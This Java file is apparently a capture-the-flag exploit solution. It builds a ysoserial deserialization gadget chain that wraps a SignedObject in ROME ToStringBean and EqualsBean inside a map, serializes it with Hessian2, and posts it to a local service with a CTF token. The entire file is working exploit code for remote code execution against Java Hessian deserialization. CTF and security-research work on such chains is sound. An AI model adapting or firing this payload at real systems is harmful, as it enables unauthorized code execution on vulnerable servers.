import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;

import ysoserial.Serializer;
import ysoserial.payloads.Eval;
import ysoserial.payloads.RomeTools;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.HttpRequest;
import ysoserial.payloads.util.Reflections;
import ysoserial.payloads.util.ser.Hessian2;

import java.security.SignedObject;
import java.util.Map;

public class Poc {
    public static void main(String[] args) throws Exception{
        byte[] ser = Hessian2.serialize(poc());
        String url = "http://127.0.0.1:8090/?token=GeCTF2022";
        HttpRequest.post(url,ser);
    }
    public static Object poc() throws Exception{
        Object o = new Eval().getObject(RomeTools.class,Fuck1.class);
        byte[] ser = Serializer.serialize(o);

        SignedObject signedObject = Gadgets.emptySignedObject();
        Reflections.setFieldValue(signedObject,"content",ser);

        ToStringBean item = new ToStringBean(signedObject.getClass(), signedObject);
        EqualsBean root = new EqualsBean(ToStringBean.class, item);

        Map map = Gadgets.createMap(root,1);

        return map;
    }
}
